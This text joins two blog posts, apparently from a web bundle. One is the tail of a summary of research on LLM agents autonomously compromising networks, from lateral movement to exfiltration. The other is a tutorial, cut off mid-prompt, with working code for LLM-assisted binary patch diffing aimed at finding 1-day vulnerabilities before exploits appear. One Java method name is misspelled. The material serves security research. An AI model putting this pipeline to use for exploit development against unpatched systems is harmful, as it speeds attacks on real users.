<p><strong>Lateral Movement:</strong> Now armed with valid SSH credentials, the LLM can pivot deeper. It chooses a “lateral movement: infect another host” task, targeting one of the internal database servers (the end goal is to reach databases). Incalmo uses the credentials to SSH into a database host and then runs an exploit or privilege escalation if needed. The LLM successfully compromises a database server with this step. It then again uses the “find information” task on the newly infected database host, which finds the stored critical data (e.g., customer records) on that machine.</p>
</li>
<li>
<p><strong>Exfiltration:</strong> Having found sensitive data, the LLM invokes the “exfiltrate data” action on the database host. Incalmo handles the mechanics (perhaps compressing and exfiltrating the data to the attacker’s machine or a drop server). The result is that the LLM obtains a chunk of the target data – for instance, one database dump file is retrieved successfully. At this point, the LLM has achieved part of the goal (data from one database). In the paper’s example, this constituted <strong>1 out of 48 files</strong> (since the Equifax environment had 48 databases with critical data).</p>
</li>
<li>
<p><strong>Scaling to Full Compromise:</strong> Crucially, the LLM doesn’t stop at one file. Noticing there are more target databases, it iteratively repeats the lateral movement and exfiltration process for each remaining database server. It systematically uses the credentials or footholds obtained to move through the network, infect all 48 database hosts, locate each critical file, and exfiltrate all of them. In effect, the LLM orchestrates a complete attack graph traversal: from initial access to total data breach across dozens of hosts. Incalmo executes each step reliably, and the attack graph service could be consulted if the LLM needed to ensure it covers all goal states.</p>
</li>
</ul>
<p>By the end of this loop, Sonnet 3.5 with Incalmo has fully compromised the Equifax-like network, achieving all attack goals. This is a striking result given that the same model without Incalmo couldn’t get beyond early reconnaissance. The case study demonstrates how the combination of LLM reasoning + Incalmo’s guidance and tools yields an autonomous agent capable of multi-host operations. Notably, the LLM was even able to handle the scale (iterating 48 times) – something that often tripped up attacks without Incalmo, where agents would stop after one success (a lack of persistence). With the structured approach, the LLM remained focused until the entire attack graph was cleared.</p>
<p>It’s worth mentioning that in this example the LLM sometimes assumed the next step – it could have alternatively queried the attack graph service to double-check prerequisites. Incalmo doesn’t force the LLM’s every decision; it provides guardrails and executes requests. The LLM still drives the overall strategy, but now with a much higher success rate for each step.</p>
<hr />
<h2>Results: Incalmo Unlocks Successful Autonomous Attacks</h2>
<p>Does Incalmo actually enable LLMs to succeed broadly? The evaluation results show a resounding yes. With Incalmo in the loop, the LLMs achieved capabilities that were previously out of reach:</p>
<ul>
<li>
<p><strong>Dramatic improvement in success rate:</strong> Using Incalmo, the LLM agents managed to <strong>partially succeed in 9 out of 10 environments</strong>, and <strong>fully succeed in 5 out of 10</strong> (in at least one trial). Recall that without Incalmo, <strong>0</strong> environments saw a full success and only <strong>1</strong> saw even a partial success. The high-level takeaway: Incalmo transformed multistage attack execution from “nearly impossible” to feasible in most cases.</p>
</li>
<li>
<p><strong>Model-agnostic benefits:</strong> The performance boost applied across different LLMs, not just the largest ones. In fact, a striking finding was that a smaller LLM with Incalmo could outperform a much larger LLM without Incalmo. For example, in the 4-Layer Chain environment, the relatively smaller Haiku 3.5 model using Incalmo was able to exfiltrate all 25 files (complete success), whereas the more powerful Sonnet 3.5 without Incalmo only managed to grab 1 file (partial success). This flips the conventional wisdom that a bigger model is always better – here the quality of guidance/abstraction mattered more than brute-force model capability. In other words, high-level task abstraction was a bigger factor for success than the underlying model size.</p>
</li>
<li>
<p><strong>Key role of the Action Planner:</strong> The ablation studies demonstrated that Incalmo’s most critical component is the action planner (high-level tasks). When the authors created a variant called <strong>Incalmo-WAP (Without Action Planner)</strong> – meaning the LLM had to issue low-level commands again, though still with the help of the state/graph services – the performance collapsed. LLMs with Incalmo-WAP failed to partially complete any goals in any of the 10 environments. This finding (“Finding 2.A”) confirms that the action planner’s abstract tasks are indispensable – they handle complexity that LLMs are otherwise bad at, enabling the whole attack to proceed.</p>
</li>
<li>
<p><strong>Impact of the auxiliary services:</strong> Incalmo’s other two components – the attack graph and environment state services – also provided measurable (though more modest) improvements. In an ablation variant <strong>Incalmo-WS (Without Services)</strong>, the LLM had the action planner but could not query the services directly (though the planner itself still used them internally for environment-agnostic execution). LLMs with Incalmo-WS did have some success, showing the action planner alone is a huge help. However, the full Incalmo (with services accessible to the LLM) enabled partial or full success in <strong>1–5 additional environments</strong> compared to Incalmo-WS, depending on the model. “Finding 2.B” quantifies this: across all LLMs tested, using the environment/attack-graph services allowed the agents to succeed in up to five more scenarios than they could without those services.</p>
</li>
<li>
<p><strong>Consistency and reliability:</strong> Another aspect examined was how reliable the success was across multiple trials. With stochastic LLM outputs, an agent might succeed in one run and fail in another. The paper notes that partial success became quite reliable in several cases – e.g., Haiku 3.5 and Sonnet 3.5 (with Incalmo) achieved partial success in all 5 trials in 5 out of 10 environments. Full success was still less consistent (only one model-environment pair achieved 100% full success rate in trials: Haiku 3.5 in the Colonial Pipeline scenario, with another model getting 4/5 in Equifax). This suggests that while Incalmo greatly improves average capability, there remains some variability (likely due to the LLM sometimes deviating or stopping early). Still, the worst-case outcome with Incalmo was often at least a partial compromise, which is far better than the across-the-board failures without it.</p>
</li>
</ul>
<p>In summary, Incalmo proved effective at enabling autonomous LLM-driven attacks. Out of the original 10 scenarios, only one remained unsolved (even partially) with Incalmo – highlighting a near-complete coverage of complex attack types that were previously impossible for the LLMs. The ablation experiments reinforced why it worked: the high-level action abstraction was critical, and the structured guidance from services provided the extra edge to maximize success. These quantitative results validate the paper’s thesis that the right interface (abstractions + information) can unlock emergent capabilities in LLMs, even more so than increasing model size.</p>
<hr />
<h2>Implications for Red-Teaming and Future Directions</h2>
<p>The findings of this research have significant implications for the security community, especially in the realms of automated red-teaming and adversary emulation. If LLMs can be guided to reliably carry out multistage attacks, they could serve as force-multipliers for security testing. Organizations could potentially deploy autonomous “Attacker LLMs” to continuously probe their networks, uncover misconfigurations, and validate defense against complex attack chains – a task traditionally requiring skilled (and expensive) human red teams. The paper’s conclusion emphasizes that fully autonomous multistage attackers can enable defenders to cheaply evaluate their security posture by running frequent, thorough tests. Incalmo demonstrates one way to realize such autonomous red team agents by giving the LLM both knowledge (attack graph context) and capability (attack tools via tasks).</p>
<p>At the same time, the authors acknowledge this prospect raises safety and ethical considerations. An agent that can penetrate networks autonomously is a double-edged sword – it could help defenders find weaknesses, but it might be misused by malicious actors. In response, the research team limited Incalmo’s built-in capabilities (only five exploits were included, covering common CVEs) to reduce potential harm. They also plan responsible disclosure: notifying major LLM providers so they can implement guardrails, and releasing Incalmo and the test environments as open-source tools for research. These steps aim to ensure that the technology is used for strengthening defenses, not aiding offense. It’s a reminder that alignment and control remain crucial as we develop AI agents with offensive skills.</p>
<h3>Future Work – Incorporating Defenders</h3>
<p>A notable limitation of the current study is that the attack environments did not include active network defenses or responsive blue-team behaviors. Real networks have intrusion detection systems, firewalls, or admins watching for threats. An important next step is to evaluate how an LLM attacker would fare against an active defender – and how it might need to adapt. The authors suggest extending Incalmo to scenarios with realistic (possibly autonomous) defenders in place. This could involve teaching the LLM to evade detection (e.g., limit noisy scans, rotate tactics if an approach is blocked) or even incorporating a game-theoretic planner that accounts for likely defensive responses. Introducing a defender would also test the LLM’s ability to strategize under pressure and modify its plan, which is a much higher bar than a static environment.</p>
<h3>Enhancing Attack Graph Reasoning</h3>
<p>While the attack graph service helped keep the LLM on track, the researchers observed that LLMs did not fully utilize it in some cases. For example, several partial successes with Incalmo were due to the LLM stopping after achieving one goal (say, exfiltrating one file) even though other goals remained. Ideally, the LLM should query the attack graph or state to realize there are more targets and continue the attack. This suggests room for improvement in how the LLM reasons about the attack graph and remaining objectives. Future enhancements might involve a more explicit planning algorithm that works alongside the LLM: e.g., an external planner that monitors which goal states are still unmet and prompts the LLM to pursue them (a form of self-reflection grounded in the attack graph). Another idea is giving the LLM more training on interpreting attack graphs or outputting a plan covering all goals before execution. The general aim is to make the agent more persistent and exhaustive – qualities needed for full network compromise. The authors hypothesize that better integration of the attack graph guidance would push partial successes to full successes more consistently.</p>
<h3>Broader Applications</h3>
<p>While this work focused on attack execution, similar principles could apply to other security domains where LLMs show promise. For instance, defenses could use LLMs to summarize security logs or find anomalies, but structured tools might enhance their accuracy. On offense, LLMs have been explored for tasks like phishing or social engineering content generation, and one can imagine frameworks analogous to Incalmo that guide LLMs in those areas (ensuring, for example, that a generated phishing campaign follows a realistic multi-step playbook). Moreover, the concept of high-level interfaces for LLM agents is not limited to security – it resonates with a growing trend in AI of using tool-based agent frameworks where LLMs delegate subtasks to tools or APIs. Incalmo serves as a case study of how powerful this approach can be: by giving an LLM the right tools and structure, we see a qualitative leap in its problem-solving ability.</p>
<hr />
<h2>Conclusion</h2>
<p><em>“On the Feasibility of Using LLMs to Execute Multistage Network Attacks”</em> ultimately delivers a cautiously optimistic message. Out-of-the-box, today’s LLMs are not ready to be master hackers – they flounder on long, complex tasks. But with carefully designed scaffolding like Incalmo, they can autonomously perform sophisticated attack campaigns that were previously only the domain of skilled humans. This opens the door to automated red-teaming agents that operate continuously and help harden systems. The research also serves as a blueprint for combining formal security knowledge (attack graphs, attack libraries) with LLM intelligence to achieve goals neither could alone. For security researchers and practitioners, it’s a compelling demonstration of how AI might transform offensive security – and a reminder that we must prepare defenses accordingly. The next steps will be refining these AI attackers, pitting them against AI defenders, and ensuring that as we unleash autonomous red-team bots, we do so responsibly and for the benefit of security overall.</p>
<hr />
<h2>References</h2>
<ol>
<li>Brian Singer, Keane Lucas, Lakshmi Adiga, Meghna Jain, Lujo Bauer, Vyas Sekar. <em>On the Feasibility of Using LLMs to Execute Multistage Network Attacks.</em> arXiv:2501.16466v2, 2025.  </li>
<li>arXiv: https://arxiv.org/abs/2501.16466  </li>
<li>
<p>PDF: https://arxiv.org/pdf/2501.16466.pdf</p>
</li>
<li>
<p>PentestGPT (baseline referenced by the paper):  </p>
</li>
<li>
<p>GitHub: https://github.com/GreyDGL/PentestGPT</p>
</li>
<li>
<p>MITRE ATT&amp;CK (high-level task inspiration context):  </p>
</li>
<li>
<p>https://attack.mitre.org/</p>
</li>
<li>
<p>MITRE Caldera (referenced in the paper as related tooling / substrate):  </p>
</li>
<li>
<p>https://caldera.mitre.org/</p>
</li>
<li>
<p>HTML (ar5iv): <a href="https://ar5iv.labs.arxiv.org/html/2501.16466v4#:~:text=These%20abstractions%20enable%20Incalmo%C2%A0%20to,Incalmo%C2%A0in%20an%20iterative%20execution%20loop" target="_blank" rel="noreferrer">ar5iv.labs.arxiv.org/html/2501.16466v4</a></p>
</li>
</ol>
`,Ym=`<h1>LLM-Assisted Binary Diffing: Finding 1-Days Before PoCs Drop</h1>
<p><strong>TL;DR</strong> — When a vendor ships a security patch, the binary itself tells the full story. Researchers have always diffed patched vs. unpatched binaries to reverse-engineer vulnerabilities. LLMs now compress that process from days to hours. This post walks through a complete technical pipeline: acquiring binaries, structuring diffs for LLM consumption, prompt engineering for vulnerability classification, and validating the output — with working code at every stage.</p>
<hr />
<h2>The 1-Day Window</h2>
<p>Every Patch Tuesday, Microsoft publishes security updates with deliberately vague descriptions: <em>&quot;Remote Code Execution vulnerability in Windows Kernel.&quot;</em> No technical details. No PoC. Just a CVE number, a severity rating, and a patched binary.</p>
<p>But here&#x27;s the thing — the patch itself <em>is</em> the vulnerability disclosure. The diff between the patched and unpatched binary reveals exactly what was broken: which function, which check was missing, which boundary wasn&#x27;t validated. For years, skilled reverse engineers have exploited this asymmetry. They diff the binaries, find the vuln, build the exploit, and use it against the enormous population of systems that haven&#x27;t patched yet.</p>
<p>That window between patch release and widespread deployment is the 1-day window. It&#x27;s always been valuable. LLMs are about to make it <em>dangerous</em>.</p>
<hr />
<h2>Why LLMs Change the Equation</h2>
<p>Traditional patch diffing requires a reverse engineer who can:</p>
<ol>
<li>Navigate thousands of changed functions to find the security-relevant ones</li>
<li>Read decompiled C pseudocode fluently</li>
<li>Recognize vulnerability patterns (off-by-one, integer overflow, UAF, type confusion)</li>
<li>Reason about exploitability — can an attacker reach this code? What primitives does it give?</li>
</ol>
<p>This is a rare skillset. Maybe a few hundred people worldwide can do it quickly and reliably. LLMs don&#x27;t replace them, but they act as a <em>force multiplier</em> that makes the initial triage phase almost instant.</p>
<p>Why this works now:</p>
<ul>
<li><strong>Decompiler output is basically C</strong> — Ghidra and IDA produce pseudocode that looks like C. LLMs are trained on enormous amounts of C. They can reason about it.</li>
<li><strong>Context windows are large enough</strong> — You can feed entire function pairs (before/after) with caller context. A year ago, you&#x27;d be truncating critical code.</li>
<li><strong>Vulnerability patterns are well-documented</strong> — The model has seen thousands of CVE descriptions, write-ups, and exploit analyses during training. It knows what an integer overflow looks like.</li>
</ul>
<p>The result: tasks that took an experienced researcher 4-8 hours of focused work can now be triaged in minutes. The human still validates, but the LLM does the heavy lifting of pattern recognition.</p>
<hr />
<h2>The Pipeline Architecture</h2>
<p>Here&#x27;s what we&#x27;re building end-to-end:</p>
<pre><code>
┌──────────────┐     ┌──────────────┐     ┌──────────────────┐
│  Patch drops  │────▶│ Extract bins │────▶│  BinDiff/Diaphora│
│  (Patch Tue)  │     │  (pre/post)  │     │  (function diff)  │
└──────────────┘     └──────────────┘     └────────┬─────────┘
                                                    │
                     ┌──────────────┐     ┌────────▼─────────┐
                     │  Structured   │◀────│ Headless Ghidra   │
                     │  LLM Prompt   │     │ (decompile both)  │
                     └───────┬──────┘     └──────────────────┘
                             │
                    ┌────────▼─────────┐
                    │   LLM Analysis   │
                    │  (multi-round)   │
                    └────────┬─────────┘
                             │
                    ┌────────▼─────────┐
                    │   Validation +   │
                    │   Scoring        │
                    └──────────────────┘
</code></pre>
<p>Each stage has real engineering decisions. Let&#x27;s walk through every one.</p>
<hr />
<h2>Stage 1: Acquiring the Binaries</h2>
<p>This sounds trivial. It isn&#x27;t. Half the battle is reliably getting the exact pre-patch and post-patch versions of the right binary.</p>
<h3>Windows (Patch Tuesday)</h3>
<p><strong>Winbindex</strong> is the gold standard. It indexes every version of every Windows system DLL and driver ever shipped, keyed by KB number. You can pull the exact binary pair you need.</p>
<pre><code class="language-python">
import requests
import json
import subprocess
import os
from pathlib import Path

class BinaryAcquirer:
    &quot;&quot;&quot;
    Acquires pre-patch and post-patch Windows binaries 
    using Winbindex for a given KB update.
    &quot;&quot;&quot;
    
    WINBINDEX_API = &quot;https://winbindex.m417z.com/data/by_filename_compressed&quot;
    SYMBOL_SERVER = &quot;https://msdl.microsoft.com/download/symbols&quot;
    
    def __init__(self, output_dir=&quot;./binaries&quot;):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def get_file_versions(self, filename):
        &quot;&quot;&quot;
        Query Winbindex for all known versions of a Windows binary.
        Returns a dict mapping version strings to download metadata.
        &quot;&quot;&quot;
        url = f&quot;{self.WINBINDEX_API}/{filename}.json.gz&quot;
        resp = requests.get(url)
        resp.raise_for_status()
        return resp.json()
    
    def find_patch_pair(self, filename, kb_number):
        &quot;&quot;&quot;
        Given a filename (e.g., &#x27;ntoskrnl.exe&#x27;) and KB number,
        find the versions immediately before and after the patch.
        
        Returns (pre_patch_info, post_patch_info) or raises if not found.
        &quot;&quot;&quot;
        versions = self.get_file_versions(filename)
        
        # Filter versions, sort by timestamp
        sorted_versions = sorted(
            versions.items(),
            key=lambda x: x[1].get(&quot;timestamp&quot;, 0)
        )
        
        post_patch = None
        pre_patch = None
        
        for version_str, info in sorted_versions:
            if kb_number.upper() in json.dumps(info).upper():
                post_patch = (version_str, info)
                break
        
        if not post_patch:
            raise ValueError(f&quot;KB {kb_number} not found for {filename}&quot;)
        
        # The version immediately before in the sorted list is our pre-patch
        post_idx = [v[0] for v in sorted_versions].index(post_patch[0])
        if post_idx &gt; 0:
            pre_patch = sorted_versions[post_idx - 1]
        
        return pre_patch, post_patch
    
    def download_binary(self, file_info, output_name):
        &quot;&quot;&quot;
        Download a specific binary version from Microsoft&#x27;s symbol server
        or directly from the update package.
        &quot;&quot;&quot;
        output_path = self.output_dir / output_name
        
        if &quot;fileInfo&quot; in file_info:
            # Use PE hash to download from symbol server
            fi = file_info[&quot;fileInfo&quot;]
            timestamp = format(fi[&quot;timestamp&quot;], &quot;X&quot;)
            size = format(fi[&quot;virtualSize&quot;], &quot;X&quot;)
            url = f&quot;{self.SYMBOL_SERVER}/{output_name}/{timestamp}{size}/{output_name}&quot;
            
            resp = requests.get(url, stream=True)
            resp.raise_for_status()
            
            with open(output_path, &quot;wb&quot;) as f:
                for chunk in resp.iter_content(chunk_size=8192):
                    f.write(chunk)
        
        print(f&quot;[+] Downloaded: {output_path} ({output_path.stat().st_size} bytes)&quot;)
        return output_path


# --- Alternative: Extract from .msu update packages directly ---

def extract_from_msu(msu_path, target_filename, output_dir):
    &quot;&quot;&quot;
    Extract a specific file from a Windows Update .msu package.
    
    MSU structure:
      .msu -&gt; contains .cab files
        .cab -&gt; contains actual binaries (sometimes nested)
    &quot;&quot;&quot;
    work_dir = Path(output_dir) / &quot;msu_work&quot;
    work_dir.mkdir(parents=True, exist_ok=True)
    
    # Step 1: Extract the .msu (it&#x27;s a cabinet archive)
    subprocess.run(
        [&quot;expand&quot;, &quot;-F:*&quot;, str(msu_path), str(work_dir)],
        check=True, capture_output=True
    )
    
    # Step 2: Find and extract the inner .cab
    for cab in work_dir.glob(&quot;*.cab&quot;):
        subprocess.run(
            [&quot;expand&quot;, &quot;-F:*&quot;, str(cab), str(work_dir / &quot;inner&quot;)],
            check=True, capture_output=True
        )
    
    # Step 3: Locate the target binary
    results = list((work_dir / &quot;inner&quot;).rglob(target_filename))
    if not results:
        raise FileNotFoundError(
            f&quot;{target_filename} not found in {msu_path}&quot;
        )
    
    return results[0]
</code></pre>
<h3>Linux Kernel</h3>
<p>For Linux, you have it easier — the source is public. But binary-level analysis on compiled kernel modules is still interesting because <strong>compiler optimizations obscure the vulnerability</strong>. The source diff might show a simple bounds check, but the compiled code might have been vectorized, inlined, or reordered.</p>
<pre><code class="language-bash">
# Get the exact commit that patched a CVE
git log --all --grep=&quot;CVE-2024-XXXXX&quot; --format=&quot;%H %s&quot;

# Get the parent (pre-patch) commit
git rev-parse &lt;patch_commit&gt;^

# Build both versions of the specific module
git checkout &lt;pre_patch_commit&gt;
make M=drivers/target_subsystem/
cp drivers/target_subsystem/target.ko ./target_pre.ko

git checkout &lt;post_patch_commit&gt;
make M=drivers/target_subsystem/
cp drivers/target_subsystem/target.ko ./target_post.ko
</code></pre>
<hr />
<h2>Stage 2: Diffing — BinDiff vs Diaphora</h2>
<p>Both tools match functions between two binaries and assign similarity scores. The interesting functions are the ones with similarity between 0.5 and 0.99 — similar enough to be the same function, but different enough that something changed.</p>
<h3>Why Diaphora Wins for This Pipeline</h3>
<p>Diaphora exports results to <strong>SQLite</strong>, which makes programmatic access trivial. BinDiff uses a custom binary format that&#x27;s painful to parse.</p>
<pre><code class="language-python">
import sqlite3
from dataclasses import dataclass
from typing import List, Optional

@dataclass
class FunctionDiff:
    &quot;&quot;&quot;Represents a single changed function between two binary versions.&quot;&quot;&quot;
    name: str
    address_original: int
    address_patched: int
    similarity_ratio: float
    pseudocode_original: Optional[str] = None
    pseudocode_patched: Optional[str] = None
    callers: Optional[List[str]] = None
    
    @property
    def is_security_relevant(self):
        &quot;&quot;&quot;
        Heuristic: functions with similarity 0.7-0.99 are most likely
        to be security patches. Below 0.7 might be refactors.
        Above 0.99 is probably just metadata/version changes.
        &quot;&quot;&quot;
        return 0.7 &lt;= self.similarity_ratio &lt;= 0.99


class DiaphoraAnalyzer:
    &quot;&quot;&quot;
    Extracts and ranks changed functions from Diaphora&#x27;s SQLite output.
    Focuses on identifying security-relevant patches.
    &quot;&quot;&quot;
    
    def __init__(self, db_path):
        self.db = sqlite3.connect(db_path)
        self.db.row_factory = sqlite3.Row
    
    def get_changed_functions(self, min_ratio=0.5, max_ratio=0.99):
        &quot;&quot;&quot;
        Extract functions that changed between versions.
        
        Sorted by ratio ASC — most changed first — because 
        the biggest changes are often the most interesting patches.
        
        Filters out:
        - Perfect matches (ratio = 1.0) — unchanged
        - Very low matches (ratio &lt; 0.5) — likely refactors, not patches
        &quot;&quot;&quot;
        cursor = self.db.execute(&quot;&quot;&quot;
            SELECT 
                name,
                address,
                address2,
                ratio,
                pseudocode,
                pseudocode2,
                md_index          -- Complexity metric
            FROM results 
            WHERE ratio &lt; ? 
              AND ratio &gt; ?
              AND name NOT LIKE &#x27;%guard%&#x27;     -- Filter out CFG stubs
              AND name NOT LIKE &#x27;%security_cookie%&#x27;
            ORDER BY ratio ASC
        &quot;&quot;&quot;, (max_ratio, min_ratio))
        
        functions = []
        for row in cursor:
            diff = FunctionDiff(
                name=row[&quot;name&quot;],
                address_original=row[&quot;address&quot;],
                address_patched=row[&quot;address2&quot;],
                similarity_ratio=row[&quot;ratio&quot;],
                pseudocode_original=row[&quot;pseudocode&quot;],
                pseudocode_patched=row[&quot;pseudocode2&quot;]
            )
            functions.append(diff)
        
        return functions
    
    def get_security_candidates(self):
        &quot;&quot;&quot;
        Returns functions most likely to be security patches.
        Uses multiple heuristics beyond just similarity ratio.
        &quot;&quot;&quot;
        all_changed = self.get_changed_functions()
        
        candidates = []
        for func in all_changed:
            score = self._security_score(func)
            if score &gt; 0.5:
                candidates.append((score, func))
        
        # Sort by security relevance score, descending
        candidates.sort(key=lambda x: x[0], reverse=True)
        return candidates
    
    def _security_score(self, func: FunctionDiff) -&gt; float:
        &quot;&quot;&quot;
        Heuristic scoring for how likely a function change is 
        a security patch vs. a feature change or refactor.
        &quot;&quot;&quot;
        score = 0.0
        
        # Similarity ratio sweet spot
        if 0.85 &lt;= func.similarity_ratio &lt;= 0.98:
            score += 0.4  # Small, targeted change = likely a fix
        
        if func.pseudocode_patched and func.pseudocode_original:
            patched = func.pseudocode_patched.lower()
            original = func.pseudocode_original.lower()
            
            # New bounds checks added
            new_checks = [
                &quot;if (&quot;, &quot;&lt; 0&quot;, &quot;&gt; 0&quot;, &quot;&lt;= 0&quot;, &quot;&gt;= 0&quot;,
                &quot;!= null&quot;, &quot;== null&quot;, &quot;!= 0&quot;,
                &quot;size&quot;, &quot;length&quot;, &quot;count&quot;, &quot;bound&quot;
            ]
            for check in new_checks:
                if check in patched and check not in original:
                    score += 0.3
                    break
            
            # New error handling
            if &quot;return&quot; in patched and patched.count(&quot;return&quot;) &gt; original.count(&quot;return&quot;):
                score += 0.2
            
            # Lock/synchronization added (race condition fix)
            sync_keywords = [&quot;lock&quot;, &quot;mutex&quot;, &quot;spinlock&quot;, &quot;critical_section&quot;]
            for kw in sync_keywords:
                if kw in patched and kw not in original:
                    score += 0.4
                    break
        
        # Function name hints
        security_names = [
            &quot;validate&quot;, &quot;check&quot;, &quot;verify&quot;, &quot;sanitize&quot;,
            &quot;parse&quot;, &quot;decode&quot;, &quot;deserialize&quot;, &quot;callback&quot;,
            &quot;alloc&quot;, &quot;free&quot;, &quot;release&quot;, &quot;dispatch&quot;
        ]
        name_lower = func.name.lower()
        for hint in security_names:
            if hint in name_lower:
                score += 0.1
                break
        
        return min(score, 1.0)
    
    def close(self):
        self.db.close()
</code></pre>
<h3>Running Diaphora</h3>
<pre><code class="language-bash">
# In IDA Pro (or use the Ghidra port):
# 1. Open the ORIGINAL binary
# 2. Run diaphora.py → export to original.sqlite

# 3. Open the PATCHED binary  
# 4. Run diaphora.py → diff against original.sqlite
# 5. Results saved to diaphora_results.sqlite
</code></pre>
<hr />
<h2>Stage 3: Headless Decompilation at Scale</h2>
<p>You need decompiled pseudocode for both versions of every changed function. Doing this manually is insane. Ghidra&#x27;s headless mode is the answer.</p>
<pre><code class="language-python">
import subprocess
import json
from pathlib import Path
from typing import Dict

class HeadlessGhidra:
    &quot;&quot;&quot;
    Drives Ghidra in headless mode to decompile specific functions
    from a binary. Only decompiles functions flagged by Diaphora
    to avoid wasting time on unchanged code.
    &quot;&quot;&quot;
    
    GHIDRA_HOME = &quot;/opt/ghidra&quot;  # Adjust to your installation
    
    def __init__(self, project_dir=&quot;./ghidra_projects&quot;):
        self.project_dir = Path(project_dir)
        self.project_dir.mkdir(parents=True, exist_ok=True)
    
    def decompile_functions(
        self, 
        binary_path: str, 
        function_addresses: list,
        project_name: str = &quot;diffproject&quot;
    ) -&gt; Dict[int, str]:
        &quot;&quot;&quot;
        Decompile specific functions from a binary using Ghidra headless.
        
        Args:
            binary_path: Path to the binary to analyze
            function_addresses: List of function addresses (int) to decompile
            project_name: Ghidra project name
            
        Returns:
            Dict mapping address -&gt; decompiled pseudocode string
        &quot;&quot;&quot;
        # Write target addresses to a file for the Ghidra script
        addr_file = self.project_dir / &quot;target_addrs.json&quot;
        addr_file.write_text(json.dumps(
            [hex(addr) for addr in function_addresses]
        ))
        
        output_file = self.project_dir / &quot;decompiled_output.json&quot;
        
        # Run Ghidra headless analyzer
        cmd = [
            f&quot;{self.GHIDRA_HOME}/support/analyzeHeadless&quot;,
            str(self.project_dir),
            project_name,
            &quot;-import&quot;, binary_path,
            &quot;-postScript&quot;, &quot;DecompileTargets.java&quot;,
            &quot;-scriptPath&quot;, str(Path(__file__).parent / &quot;ghidra_scripts&quot;),
            &quot;-overwrite&quot;,
            &quot;-deleteProject&quot;,  # Clean up after
        ]
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=600  # 10 min timeout per binary
        )
        
        if result.returncode != 0:
            print(f&quot;[!] Ghidra stderr:\\n{result.stderr[-2000:]}&quot;)
            raise RuntimeError(&quot;Ghidra analysis failed&quot;)
        
        # Parse output
        if output_file.exists():
            return json.loads(output_file.read_text())
        
        return {}
</code></pre>
<p>And the corresponding Ghidra script (<code>DecompileTargets.java</code>):</p>
<pre><code class="language-java">
// DecompileTargets.java — Ghidra postScript
// Decompiles only the functions at addresses specified in target_addrs.json
// Outputs results to decompiled_output.json

import ghidra.app.decompiler.DecompInterface;
import ghidra.app.decompiler.DecompileResults;
import ghidra.app.script.GhidraScript;
import ghidra.program.model.listing.Function;
import ghidra.program.model.listing.FunctionManager;
import ghidra.program.model.address.Address;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import java.io.*;
import java.util.*;

public class DecompileTargets extends GhidraScript {
    
    @Override
    public void run() throws Exception {
        // Read target addresses
        File addrFile = new File(
            getProjectRootFolder().getProjectLocator()
                .getProjectDir().getParent(),
            &quot;target_addrs.json&quot;
        );
        
        Gson gson = new Gson();
        List&lt;String&gt; targetAddrs = gson.fromJson(
            new FileReader(addrFile),
            new TypeToken&lt;List&lt;String&gt;&gt;(){}.getType()
        );
        
        // Set up decompiler
        DecompInterface decomp = new DecompInterface();
        decomp.openProgram(currentProgram);
        
        FunctionManager funcMgr = currentProgram.getFunctionManager();
        Map&lt;String, Object&gt; results = new HashMap&lt;&gt;();
        
        for (String addrStr : targetAddrs) {
            long addrLong = Long.parseLong(
                addrStr.replace(&quot;0x&quot;, &quot;&quot;), 16
            );
            Address addr = currentProgram.getAddressFactory()
                .getDefaultAddressSpace().getAddress(addrLong);
            Function func = funcMgr.getFunctionAt(addr);
            
            if (func == null) {
                // Try to find containing function
                func = funcMgr.getFunctionContaining(addr);
            }
            
            if (func != null) {
                DecompileResults res = decomp.decompileFunction(
                    func, 120, monitor  // 120 second timeout per function
                );
                
                if (res.depiledFunction() != null) {
                    Map&lt;String, String&gt; funcData = new HashMap&lt;&gt;();
                    funcData.put(&quot;name&quot;, func.getName());
                    funcData.put(&quot;pseudocode&quot;, 
                        res.getDecompiledFunction().getC());
                    funcData.put(&quot;signature&quot;, 
                        func.getSignature().getPrototypeString());
                    
                    // Get callers (cross-references)
                    List&lt;String&gt; callers = new ArrayList&lt;&gt;();
                    for (var ref : getReferencesTo(func.getEntryPoint())) {
                        Function caller = funcMgr.getFunctionContaining(
                            ref.getFromAddress()
                        );
                        if (caller != null) {
                            callers.add(caller.getName());
                        }
                    }
                    funcData.put(&quot;callers&quot;, String.join(&quot;, &quot;, callers));
                    
                    results.put(addrStr, funcData);
                }
            }
        }
        
        // Write output
        File outFile = new File(addrFile.getParent(), 
            &quot;decompiled_output.json&quot;);
        try (FileWriter fw = new FileWriter(outFile)) {
            gson.toJson(results, fw);
        }
        
        println(&quot;[+] Decompiled &quot; + results.size() + &quot; functions&quot;);
    }
}
</code></pre>
<h3>Key Optimization: Don&#x27;t Decompile Everything</h3>
<p>On a binary like <code>ntoskrnl.exe</code> with 30,000+ functions, full decompilation takes over an hour. We only need the ~20 functions Diaphora flagged. This brings it down to seconds.</p>
<pre><code class="language-python">
# Only decompile what Diaphora flagged as changed
analyzer = DiaphoraAnalyzer(&quot;diaphora_results.sqlite&quot;)
candidates = analyzer.get_security_candidates()

# Extract just the addresses we need
original_addrs = [c[1].address_original for c in candidates]
patched_addrs = [c[1].address_patched for c in candidates]

ghidra = HeadlessGhidra()
original_decomp = ghidra.decompile_functions(
    &quot;ntoskrnl_original.exe&quot;, original_addrs
)
patched_decomp = ghidra.decompile_functions(
    &quot;ntoskrnl_patched.exe&quot;, patched_addrs
)
</code></pre>
<hr />
<h2>Stage 4: Prompt Engineering — The Critical Layer</h2>
<p>This is where most people would screw up. You can&#x27;t just dump two walls of pseudocode and say &quot;find the bug.&quot; The model needs structured context and specific questions.</p>
<h3>The Prompt Template</h3>
<pre><code class="language-python">
def build_analysis_prompt(func_diff, original_code, patched_code, callers):
    &quot;&quot;&quot;
    Constructs a structured prompt for LLM vulnerability analysis.
    
    Key principles:
    - Show BOTH versions side-by-side (not just the diff)
    - Include caller context (reachability matters)
    - Ask structured questions (prevents rambling)
    - Request specific output format (parseable)
    &quot;&quot;&quot;
    
    prompt = f&quot;&quot;&quot;## Binary Patch Analysis

### Target
- **Function**: \`{func_diff.name}\`
- **Binary**: ntoskrnl.exe (Windows Kernel)
- **Similarity ratio**: {func_diff.similarity_ratio:.3f}
- **Known callers**: {&#x27;, &#x27;.join(callers) if callers else &#x27;Unknown&#x27;}

### BEFORE (Unpatched / Vulnerable Version):
</code></pre>
<p>{original_code}</p>
<pre><code>

### AFTER (Patched Version):
